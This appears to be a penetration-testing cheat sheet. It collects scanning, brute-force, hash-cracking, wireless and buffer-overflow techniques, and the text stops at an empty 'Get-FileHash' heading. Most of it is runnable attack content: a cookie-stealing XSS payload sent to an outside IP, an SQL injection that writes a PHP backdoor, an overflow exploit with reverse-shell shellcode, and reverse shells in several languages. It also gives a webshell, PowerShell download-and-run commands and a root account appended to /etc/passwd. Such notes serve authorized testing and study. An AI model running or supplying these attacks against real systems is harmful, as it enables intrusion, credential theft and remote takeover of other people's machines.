# Table of Contents
* [Enumeration](#Enumeration)
* [Web Application Attacks](#Web-Application-Attacks)
* [Brute Forcing](#Brute-Forcing)
* [Cracking Hashes](#Cracking-Hashes)
* [Wireless Attacks](#Wireless-Attacks)
* [OSINT](#OSINT)
* [Buffer Overflow](#Buffer-Overflow)
* [Linux](#Linux)
* [Windows](#Windows)
* [Protocols](#Protocols)
* [Technologies](#Technologies)
* [Known Vulnerabilities](#Known-Vulnerabilities)
* [Forensics](#Forensics)
* [Misc](#Misc)

# Enumeration
## Port Scanning

``` bash
nmap -sC -sV -oA outfiles 192.168.1.0/24
nmap --top-ports=1000 -sT -Pn 10.10.10.10,11,12 --open
nmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3
nmap -T4 -Pn -p- 10.10.10.10 -o tmp.nmap > /dev/null
nmap -sC -sV -o portscan.nmap -p $(cat tmp.nmap | grep open | cut -d\t -f1 | sed 's/\///g' | paste -sd, ) 10.10.10.10 > /dev/null
for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -p$i -A 192.168.67.133; done
nmap -sU 10.10.10.116 # UDP
```

## Web Application Enumeration

### BurpSuite
Go to "Target" > "Site map" > right click on host > "Spider this host" 

### Directory Enumeration
```
gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
```

Install golang and add the following two lines to ~/.bashrc (or ~/.profiles)

```
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin		
```
## Vulnerability Scan
### Nessus
```
sudo /etc/init.d/nessus start 
# http://localhost:8834

```
### Nikto
Installation:
```
sudo apt install nikto
```
Usage:
```
nikto -h <hostname/IP>
nikto -h <hostname/IP> -port 80,443
```



### SQL Enumeration
Connect remotely to mysql database:
```
mysql --host=10.10.10.10 --port=1234 --user=db_user -p
```
Show privileges
```
SHOW Grants;
show variables;
```
### [Assetfinder](https://github.com/tomnomnom/assetfinder)

```
go get -u github.com/tomnomnom/assetfinder
```

:information_source: also see [amass](https://github.com/OWASP/Amass)

### [Httprobe](https://github.com/tomnomnom/httprobe) (find alive domains)

```
go get -u github.com/tomnomnom/httprobe
```

## [GoWitness](https://github.com/sensepost/gowitness) (Screenshotting Websites)

```
go get -u github.com/sensepost/gowitness
```

# Web Application Attacks
## Cross Site Scripting (XSS)
:information_source: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)
:information_source: https://www.scip.ch/en/?labs.20171214 
:information_source: https://xss-game.appspot.com/
:information_source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
:information_source: https://github.com/payloadbox/xss-payload-list
:information_source: https://tryhackme.com/room/learnowaspzap

## XML External Entities (XXE)
Basic idea: upload an xml to test if it gets parsed and then abusing the doctype definition (DTD).

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

## SQL Injection
### Resources
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
* https://github.com/payloadbox/sql-injection-payload-list

### Manual Enumeration
```
http://10.10.10.10/debug.php?id=1 order by 1 # increase until an error occurs to get number of columns

http://10.10.10.10/debug.php?id=1 union all select 1, 2, 3
http://10.10.10.10/debug.php?id=1 union all select 1, username, password
http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### sqlmap
* example commands
```
sqlmap --url http://10.10.128.77:8000/sqlpanel --tables --columns
sqlmap -r sqlpanel.request --dbms=sqlite --dump-all --tamper=space2comment
```
* capture sqlpane.request with burpsuite first
* --tamper=space2comment for trying to bypass WAF

## Server Side Template Injection (SSTI)
Server-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side

* See https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
* Payload Generator: https://github.com/VikasVarshney/ssti-payload

Make sure to try every syntax
```
*{}
${}
#{}
```

## WebDAV
WebDAV is an extenstion of HTTP that allows clients to perform remote Web content authoring operations. RFC4918.

### Resources
* [Blogpost from Nullbyte](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
* HackTheBox: Granny 

### davtest
DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.
```
davtest -url http://10.10.10.15
```

### cadaver
Cadaver is a simple command-line client, similar to for example the 'ftp' program. It has some advanced features such as lock-management, property management, DASL and version control support.
```
cadaver http://10.10.10.15/mfu
```

## Cookie Stealer
```
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

See Github Repo 'Redline'


# Brute Forcing
:information_source: Password Lists: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
## medusa
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

## hydra
For ssh try shorter password lists like ``/usr/share/wfuzz/wordlist/others/common_pass.txt``
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-get
# specify number of threads with -t to avoid getting blocked
hydra -l user -P wordlist ssh://10.10.10.10 -f -V -t 3
```
Get help for service module
```
hydra http-form-post -U
```
Example:
```
hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
# use -f to stop the attack once a result is found
```

Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
## wfuzz

``` bash
wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’username=admin&password=FUZZ’ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
wfuzz --hc 404 -c -z file,big.txt http://10.10.26.165/site-log.php\?date=FUZZ
```

## RDP
* [crowbar](https://github.com/galkan/crowbar)
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
In case of error: "File: /usr/share/wordlists/rockyou.txt doesn't exists" it is due encoding issues.
Convert list with:
```
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou_utf8.txt
````

## Archives
Bruteforce password protected .zip or .rar file
* fcrackzip
* rarcrack
* john the ripper => zip2john, rar2john

# Cracking Hashes
:information_source: Password Lists: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

## Identify Hash
* [hash-identifier](https://psypanda.github.io/hashID/)
* [Sample Password Hashes](https://openwall.info/wiki/john/sample-hashes)

## Example MD5 Hash
```
hashcat --example-hashes | grep MD5 -C 4
hashcat -m 500 hash rockyou.txt
hashcat -m 500 -a0 --force 'tmp' '/usr/share/wordlists/rockyou.txt'	
```

# Wireless Attacks
## WPS Pin Recovery
```
reaver -i wlan0mon -b 9C:AD...(network-target-mac) -c 1 (channel 1) -f (fixed:one channel) -a -w(win7 register art) -v (verbose) -K 1 (Pixie-attack: hit common pins)
#if Pixie (-K 1 doesnt work, run -vv (very verbose))
```

## Capture WPA/WPA2 Handshake
```
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
airmon-ng
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
```
```
airodump-ng wlan0mon [--bssid F0:7B.... where F0:7B.. is mac of "target-router"][--channel 11][--write Desktop/path/to/my/file]
```
```
aireplay-ng wlan0mon [--deauth 2000 (sending 2000 deauth packages)][-a F0:7B.. (-a: Accesspoint:Macadress of router)][-c F9:2D..(-c:Client: Macadress of target)]
#sending deauth packages to force a handshake
```

## Crack WPA/WPA2 Handshake

```
aircrack-ng Path/to/my/captureFile/with/handshake.cap -w /Path/to/my/password/list.txt
```

# OSINT
TO BE DONE: Add PP content
* https://namechk.com/
* https://whatsmyname.app/,
* https://namecheckup.com/
* https://github.com/WebBreacher/WhatsMyName
* https://github.com/sherlock-project/sherlock
* https://netcraft.com

## Search for breaches
* https://haveibeenpwned.com/
* https://scylla.sh    # provides password, free
* https://dehashed.com/   # provides password, paid

# Buffer Overflow
* Check if you can write executable code in the stack with peda: ``checksec``. 
* Alternatively you have to do it manually or use a script: https://github.com/slimm609/checksec.sh/blob/master/README.md 
* If NX is enabled writing shellcode into buffer will not execute

## Concept
```
     STACK

________________
|   Function   |
----------------
|     Data     |
----------------
|Return Address|
----------------
|Base Pointers |
----------------
|      ^       |
|      |       |
|              |
|    Buffer    |
|              |
|              |
________________
```
* Try to exceed buffer and overwrite base pointers and return address
* Craft buffer according to the following concept 

```bash
python -c 'print "\x90" * 470 + "<shellcode>" + "<memory address in middle of NOPs>" 
```
* \x90 is a NOP and works like a sled since it gets skipped
* therefore run the binary and check $esp for NOP's
* choose address in middle and paste it as 'memory address in middle of NOPs'
* in the example the offset is 500
* $eip gets overwritten with memory address in middle of NOP's
* NOP's get hit 
* instructions follow until shellcode is hit and executes

## ret2libc
* you need the libc address as kind of a 'base'
* afterwards the stack frame dictates the order the function call and parameters are written
* see this [link](https://newbedev.com/why-must-a-ret2libc-attack-follow-the-order-system-exit-command) (explains it much better)
```
function_address
return_address
parameters
```
* so either try to provide some junk for parameters so the function may return to your payload
* or provide actual exit address and payload as parameter for system()

1. find the libc address 
```bash
ldd <binary>
```
2. find the system() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
3. find the exit() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
```
4. find /bin/sh in libc
```bash
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
5. create simple python script to print payload
```python
import struct

junk = "A" * 52

libc_addr = 0xf7d79000
sh_addr = struct.pack('<I', libc_addr + 0x0015ba0b)
system_addr = struct.pack('<I', libc_addr + 0x0003ada0)
exit_addr = struct.pack('<I', libc_addr + 0x0002e9d0)

payload = junk + system_addr + exit_addr + sh_addr

print payload
```

## Example
```
# First try to get exact overflow with either msf-pattern_create or by manual/scripted fuzzing
# Example: Offset at 1252
# Overwrite EIP with 'B's and check with debugger if a register points into memory that we can control
#
# Example: 
# < 1252 >
# AAA...AABBBBCCCCCCCCCCCCCCCCCC
#         \  /\                 /
#          \/  \               /
#         EIP  ESP points to this
#
# Check for badchars, see https://github.com/cytopia/badchars
# Simply paste 'A's and the badchars, follow the dump at crash and check what characters are not allowed '\x00'
# Example badchars: \x0a\x1a\x1b\xae\xce\x69
#
# Generate shellcode
# msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.119.232 LPORT=4444 -f python -b "\x0a\x1a\x1b\xae\xce\x69"
# => 351 bytes
buf =  b"" 
buf += b"\xda\xcb\xd9\x74\x24\xf4\xbe\xec\xf0\x80\xa0\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x73\x13\x03\x9f\xe3\x62"
buf += b"\x55\xa3\xec\xe1\x96\x5b\xed\x85\x1f\xbe\xdc\x85\x44"
buf += b"\xcb\x4f\x36\x0e\x99\x63\xbd\x42\x09\xf7\xb3\x4a\x3e"
buf += b"\xb0\x7e\xad\x71\x41\xd2\x8d\x10\xc1\x29\xc2\xf2\xf8"
buf += b"\xe1\x17\xf3\x3d\x1f\xd5\xa1\x96\x6b\x48\x55\x92\x26"
buf += b"\x51\xde\xe8\xa7\xd1\x03\xb8\xc6\xf0\x92\xb2\x90\xd2"
buf += b"\x15\x16\xa9\x5a\x0d\x7b\x94\x15\xa6\x4f\x62\xa4\x6e"
buf += b"\x9e\x8b\x0b\x4f\x2e\x7e\x55\x88\x89\x61\x20\xe0\xe9"
buf += b"\x1c\x33\x37\x93\xfa\xb6\xa3\x33\x88\x61\x0f\xc5\x5d"
buf += b"\xf7\xc4\xc9\x2a\x73\x82\xcd\xad\x50\xb9\xea\x26\x57"
buf += b"\x6d\x7b\x7c\x7c\xa9\x27\x26\x1d\xe8\x8d\x89\x22\xea"
buf += b"\x6d\x75\x87\x61\x83\x62\xba\x28\xcc\x47\xf7\xd2\x0c"
buf += b"\xc0\x80\xa1\x3e\x4f\x3b\x2d\x73\x18\xe5\xaa\x74\x33"
buf += b"\x51\x24\x8b\xbc\xa2\x6d\x48\xe8\xf2\x05\x79\x91\x98"
buf += b"\xd5\x86\x44\x0e\x85\x28\x37\xef\x75\x89\xe7\x87\x9f"
buf += b"\x06\xd7\xb8\xa0\xcc\x70\x52\x5b\x87\xbe\x0b\x14\xbf"
buf += b"\x57\x4e\xda\x2e\xf4\xc7\x3c\x3a\x14\x8e\x97\xd3\x8d"
buf += b"\x8b\x63\x45\x51\x06\x0e\x45\xd9\xa5\xef\x08\x2a\xc3"
buf += b"\xe3\xfd\xda\x9e\x59\xab\xe5\x34\xf5\x37\x77\xd3\x05"
buf += b"\x31\x64\x4c\x52\x16\x5a\x85\x36\x8a\xc5\x3f\x24\x57"
buf += b"\x93\x78\xec\x8c\x60\x86\xed\x41\xdc\xac\xfd\x9f\xdd"
buf += b"\xe8\xa9\x4f\x88\xa6\x07\x36\x62\x09\xf1\xe0\xd9\xc3"
buf += b"\x95\x75\x12\xd4\xe3\x79\x7f\xa2\x0b\xcb\xd6\xf3\x34"
buf += b"\xe4\xbe\xf3\x4d\x18\x5f\xfb\x84\x98\x6f\xb6\x84\x89"
buf += b"\xe7\x1f\x5d\x88\x65\xa0\x88\xcf\x93\x23\x38\xb0\x67"
buf += b"\x3b\x49\xb5\x2c\xfb\xa2\xc7\x3d\x6e\xc4\x74\x3d\xbb"
buffer = b"A"*1252
eip = b"\xb2\x11\x80\x14"
shellcode = buf 
nops = b"\x90"*12
buffer2 = b"B"*1000

payload = buffer + eip + nops + shellcode + buffer2

f = open('payload', 'wb')
f.write(payload)
f.close()

# cat payload | nc 10.10.10.10 5000
```
## EDB Debugger (Linux)
Install
```
sudo apt install edb-debugger
```
### Search a return address
1. See Plugins > OpcodeSearcher
2. Search ESP -> EIP and select your program

## Immunity Debugger (Windows)
### Finding a Return Address
```
» msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp

```
Use the mona plugin and run
```
!mona modules # get all modules
!mona find -s "\xff\xe4" -m "program.dll"
```
Check if the address contain any bad chars since it will most likely not work otherwise


# Linux
## Bash
* https://www.bashoneliners.com/
* https://wiki.bash-hackers.org/syntax/expansion/brace

### Create Password List
Create text file with keywords
```bash
January 
February
March
April
May
June
July
August
September
October
November
December
Autumn
Spring
Fall
Summer
Winter
Password
Forest
Secret
```
```bash
for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; echo ${i}2020; echo ${i}2019; done > tmp
mv tmp pwlist.txt

hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/leetspeak.rule -r /usr/share/hashcat/rules/toggles1.rule   > tmp
mv tmp pwlist.txt
```

## Custom wordlist generator
Fetch Keywords from a website
* [CeWL](https://digi.ninja/projects/cewl.php)
```
cewl www.domain.com -m 6 -w wordlist.txt
```
* [crunch](https://sourceforge.net/projects/crunch-wordlist/)

|Placeholder| 	Character Translation|
|----------|-------------------|
|@ |Lower case alpha characters|
|, |Upper case alpha characters|
|% |Numeric characters|
|^ |Special characters including space|
```
crunch 6 6 -t %%%%^^ > chars.txt
crunch 24 24 -t ThisIsTheUsersPassword%% -o crunched.txt 
```

## RDP Tool for Linux
* Remmina (apt install remmina)
* xfreerdp (installed by default on kali)
Proxychains example with xfreerdp
```
proxychains xfreerdp /d:domain /u:user /v:10.10.10.10 +clipboard
```

## Download Accelerator
```bash
axel -a -n 20 -o report.pdf https://dummy.org 
```

## Log commands into file
```
script cmd.log
exit
```

## Automated IP Lookup
```bash
~/mfu# curl -s https://api.greynoise.io/v3/community/8.8.8.8 | python3 -m json.tool
{
    "ip": "8.8.8.8",
    "noise": false,
    "riot": true,
    "classification": "benign",
    "name": "Google Public DNS",
    "link": "https://viz.greynoise.io/riot/8.8.8.8",
    "last_seen": "2021-03-30",
    "message": "Success"
}
```

## Pasteable Archive Generator (Pasta)
```
#!/bin/bash
#
# Create a script to recreate the specified file in a different place.
# (pasta stands for *PAST*eable *A*rchive)
#
# Requirements:
#  for this script:
#    - bash, gzip, base64
#
# for the generated script:
#    - Bourne shell from UNIX v7 or later
#    - OpenSSL with base64, or
#      base64 from GNU coreutils, or
#      base64 from BSD
#    - gunzip
#
# v2 enhancements:
# ----------------
#  * work around ~20 year old bug in the Almquist shell and descendants
#  * do not depend on external shell libraries anymore
#  * more documentation
#  * support XZ and zopfli compression
#  * support ASCII85 and Base91 encoding
#
set -eu
quit(){
            echo "$*" >&2
            exit 1
}

usage(){
cat<<EOF
Usage: $0 [OPTION]... [FILE] [OUTFILE]

Create a 7-bit clean *past*eable *a*rchive
OUTFILE is optional

  -p     Recreate file permissions
  -P     Recreate file at same path with same permissions (implies -p)
  -v     go viral!
  -z     zopfli compression (output compatible with gzip)
  -x     XZ compression
  -o     Optimal compression. Automatically choose best method
  -Z     old 'compress'
  -s     Shorter script, but less portable (GNU tools only)
  -6     Base64 encoding (default)
  -9     Base91 encoding
  -a     Ascii85 encoding
  -w N   wrap after N characters (default $WIDTH)
  -c     put output into clipboard
  -f     aa ('ascii armor') encoding
EOF
exit 0
}

# default options can be specified in PASTA env
[ "${PASTA-}" ] && set -- $PASTA "$@"
WIDTH=78
ENCODE="(openssl base64 2>&-||base64)"
# long option '--decode' needed for compatibility with FreeBSD base64
# (also used in MacOS X)
DECODE="(openssl base64 -d 2>&-||base64 --decode)"
COMPRESS="gzip -cn9"
DECOMPRESS="gunzip"
PERM=''
REC=''
EXTRA=''
CLIP=''
OPTC=''
BASE64=1
SELF=''
AA=''
while getopts "w:sxaz9pcoZh6rPvf" opt; do
            case $opt in
            o)
                        OPTC=1
                        ;;
            c)
                        CLIP=1
                        ;;
            p)
                        PERM=1
                        ;;
            r|P)
                        PERM=1
                        REC=1
                        ;;
            v)
                        PERM=1
                        REC=1
                        SELF=1
                        ;;
            z)
                        COMPRESS="zopfli -c"
                        ;;
            s)
                        ENCODE="(openssl base64 2>&-||base64)"
                        DECODE="base64 -d"
                        COMPRESS="gzip -cn9"
                        DECOMPRESS="zcat"
                        ;;
            Z)
                        COMPRESS="compress -c"
                        DECOMPRESS="uncompress"
                        ;;
            x)
                        COMPRESS="xz --x86 --lzma2=preset=9e -c"
                        DECOMPRESS="unxz"
                        ;;
            6)
                        BASE64='1'
                        DECODE="(openssl base64 -d 2>&-||base64 --decode)"
                        ENCODE="(openssl base64 2>&-||base64)"
                        ;;
            9)
                        BASE64=''
                        ENCODE="base91"
                        DECODE="base91 -d"
                        ;;
            a)
                        BASE64=''
                        ENCODE="ascii85 -n"
                        DECODE="ascii85 -dn"
                        ;;
            w)
                        WIDTH=$OPTARG
                        ;;
            f)
                        BASE64=''
                        AA='1'
                        ;;
            h)
                        usage
            esac
done
ORIGOPT="$@"
shift $((OPTIND - 1))
 
FILE="${1-}"
[ -z "$SELF" ] || FILE=$0
OUT="${2-}"
[ -n "$FILE" ] || usage
[ -r "$FILE" ] || quit "Can't read $FILE"
[ -f "$FILE" ] || quit "$FILE is not a regular file"
 
if [ "$PERM" ]; then
            if [ "$OSTYPE" = "linux-gnu" ]; then
                        PERM=$(stat -c '%a' "$FILE")
            else
                        PERM=$(stat -f '%A' "$FILE")
            fi
            EXTRA=";chmod $PERM \$F"
fi
 
if [ "$CLIP" -a ! "${CLIPEXEC-}" ]; then
            echo "Copying to clipboard..."
            if [ "$OSTYPE" = "linux-gnu" ]; then
                        CLIP="xclip"
            else
                        CLIP="pbcopy"
            fi
            CLIPEXEC=1 bash $0 $ORIGOPT | $CLIP
            echo "Done"
            exit 0
fi
 
if [ "$OPTC" ]; then
            zopfli=$(zopfli -c "$FILE"|wc -c)
            xz=$(xz --x86 --lzma2=preset=9e -c "$FILE"|wc -c)
            if [ "$zopfli" -lt "$xz" ]; then
                        COMPRESS="zopfli -c"
            else
                        COMPRESS="xz --x86 --lzma2=preset=9e -c"
                        DECOMPRESS="unxz"
            fi
fi
 
if [ "${OUT}" ]; then
            FBASE=$OUT
elif [ "$REC" ]; then
            FBASE=$(realpath -s -- "$FILE" 2>&- || readlink -f -- "$FILE")
else
            FBASE=${FILE##*/}
fi
 
# escape metacharacters
OUT=$(printf "F=%q" "$FBASE")
if [ "$BASE64" ]; then
            LINE="$DECODE<<E-O|$DECOMPRESS>\$F&&echo OK$EXTRA"
elif [ "$AA" ]; then
            echo "aa -p"
            if [ "$PERM" ]; then
                        aa pasta "$FBASE" "$PERM" < "$FILE"
            else
                        aa pasta "$FBASE" < "$FILE"
            fi
            exit
else
            LINE="$DECODE<<'E-O'|$DECOMPRESS>\$F&&echo OK$EXTRA"
fi
if [ $(( ${#OUT} + ${#LINE} )) -lt "$WIDTH" ];
then
            echo "$OUT;$LINE"
else
            echo "$OUT"
            echo "$LINE"
fi
ENCODE="$ENCODE | tr -d '\n' | fold -w $WIDTH"
$COMPRESS "$FILE" | eval "$ENCODE"
echo
echo "E-O"
echo
```

## Generate Shellcode from file
```
xxd -p lib.so | tr -d '\n' > lib.hex
# add '0x' before shellcode
```

## unshadow passwd file
```
unshadow passwd-file.txt shadow-file.txt
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

## Reverse Shells
Use rlwrap to use arrow keys within reverse shell
```
rlwrap nc -lvnp 3141
```

Upgrade Reverse Shell:

1. `` Ctrl+z`` to background session
2. `` stty raw -echo``
3. ``fg`` to foreground session again

### Netcat
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f # in case wrong version of nc is installed
```

### Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Socat
```
# Listener
socat -d -d TCP4-LISTEN:443 STDOUT
# Send bash reverse shell
socat TCP4:10.10.10.10:443 EXEC:/bin/bash
```

### Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
#!/usr/bin/perl -w
use Socket;
$i="10.10.14.41";
$p=4443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
};
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### very simple PHP webshell
```
<?php system($\_GET["cmd"]);?>
```

 
### Using msfvenom 
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
msfvenom -p windows/exec CMD="cmd.exe /c type flag.txt" -f python -b"x00\x0a\x0d\x25\x26\x2b\x3d"
```

### Encrypted Shell
Socat Bind Shell
```
# Create Cert and Key
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
# Create .pem file
cat bind_shell.key bind_shell.crt > bind_shell.pem
# Setup Listener
sudo socat OPENSSL-LISTEN:443,cert=bin_shell.pem,verify=0,fork EXEC:/bin/bash
# OR Setup Listener with
sudo socat -d -d OPENSSL-LISTEN:443,cert=rev_shell.pem,verify=0,fork STDOUT
# Connect
socat - OPENSSL:10.10.10.10:443,verify=0
# OR Connect with
socat OPENSSL:192.168.119.223:443,verify=0 EXEC:'cmd.exe',pipes

```

## Privilege Escalation
Resources:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
* https://payatu.com/guide-linux-privilege-escalation
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation

### Get Capabilities
```
/sbin/getcap -r / 2>/dev/null
```

### Unix Privesc Check
* [unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)

### LinEnum
Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 

### Setuid bits
* https://gtfobins.github.io/
``` 
# Find SUID files
find / -user root -perm -4000 2>/dev/null
# Set UID bit
chmod u+s /script
```
### Search for executed cronjobs
```
grep "CRON" /var/log/cron.log
```

### Add user in /etc/passwd (if writable)
```
openssl passwd evil
echo "root2:Ur0xZo454Kq1s:0:0:root:/root/:/bin/bash" >> /etc/passwd
su root2 # passwd:evil
```

## Dump screenshot from X11 session
Prerequisite: .Xauthority file from session
1. define XAUTHORITY variable: ``export XAUTHORITY=/tmp/.Xauthority``
2. get display used (FROM column): ``w``
3. use xwd to dump screenshot: ``xwd -root -screen -silent -display :0 > /tmp/screen.xwd``
4. convert xwd to png: ``convert screen.xwd screen.png``


## Port Forwarding 
### Create SSH Key with forwarding permissions only
```
from="10.11.1.250",command="echo 'This account can only be used for port
forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa
<SSHKEY> www-data@ajla
```

### Local Port Forwarding
Port is opened locally 

[rinetd](https://boutell.com/rinetd/) :
```
sudo apt install rinetd
echo "0.0.0.0 80 10.10.10.10 80" >> /etc/rinetd.conf # forward incoming requests on port 80 to 10.10.10.10 port 80
sudo service rinetd restart
```

SSH:
```
sudo ssh -N -L [bind_address:]port:host:hostport [username@address]
sudo ssh -N -L 127.0.0.1:1234:10.10.10.10:5678 user@10.10.10.10
# open 1234 locally and forward it to 11.11.11.11 on port 5678
```

### Remote Port Forwarding 
Port is opened on the remote side
```
ssh -N -R [bind_address:]port:host:hostport [username@address]
ssh -N -R 10.10.10.10:4444:127.0.0.1:5555 user@10.10.10.10
# open port 4444 on 10.10.10.10 and forward ot to 127.0.0.1 port 5555
```
## SSH Dynamic Port Forwarding
Use proxy to tunnel any incoming traffic on local port to any remote destination
```
sudo ssh -N -D [bind_address:]port [username@address]
sudo ssh -N -D 127.0.0.1:4444 user@10.10.10.10 # open port 4444 and forward to 10.10.10.10
```
Edit /etc/proxychains.conf 
```
echo "socks 4 127.0.0.1 4444" >> /etc/proxychains.conf
sudo proxychains nmap -sT -Pn 10.10.10.12 # scan 10.10.10.12 through 10.10.10.10
```

## HTTPTunneling Through Deep Packet Inspection
* [HTTPTunnel](http://http-tunnel.sourceforge.net/)

Assuming the following setup:

Attacker Machine (Kali): 10.10.10.10
Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
Windows Server: 192.168.1.100
Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
Objective: Get a RDP Session to the Windows Server

1. Setup local forward on compromised machine
```
ssh -L 0.0.0.0:8888:192.168.1.100:3389
```
2. Setup HTTPTunnel server on compromised machine (hts)
```
hts --foward-port localhost:8888 4444
```
3. Setup HTTPTunnel client on attacker machine
```
htc --forward-port 8080 10.10.10.10:4444
```
4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)


# Windows
## Strings.exe
```
C:\Tools\strings64.exe -accepteula file.exe
```

## Alternate Data Stream (ADS)
Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.

```
Get-Item -Path file.exe -Stream *

wmic process call create $(Resolve-Path file.exe:streamname)
```
## Powershell
### User Management
* add user
```
net user <username> <password> /add /domain
```
* add user to group
```
net group <group> <username> /add
```
### Transfer Files
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:8000/file", "C:\Users\user\Desktop\file")
Copy-Item \\10.10.14.13\share\file C:\Users\user\Desktop\file
```
### Reverse shell with local authentication
* assuming you already found credentials (for example by running powerup)
```powershell
$pass = ConvertTo-SecureString 'Password!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.13:8000/rev.ps1')" -Credential $cred
```

#### Misc Commands
**Get-ChildItem**
* ```-Path``` Specifies a path to one or more locations. Wildcards are accepted.
* ```-File``` / -Directory To get a list of files, use the File parameter. To get a list of directories, use the Directory parameter. You can use the Recurse parameter with File and/or Directory parameters.
* ```-Filter``` Specifies a filter to qualify the Path parameter.
* ```-Recurse``` Gets the items in the specified locations and in all child items of the locations.
* ```-Hidden``` To get only hidden items, use the Hidden parameter.
* ```-ErrorAction``` SilentlyContinue Specifies what action to take if the command encounters an error.
```
Get-ChildItem -Hidden
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```

**Get-Content**
```
Get-Content -Path file.txt
Get-Content file.txt | Select -first 10
Get-Content file.txt | Select-String 'searchstring'
Get-Content -Path file.txt | Measure-Object -Word
(Get-Content -Path file.txt)[index]
```

**Select-String**
```
Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'
Select-String -Path file.txt -Pattern 'searchstring'
```

**Get-FileHash**
```
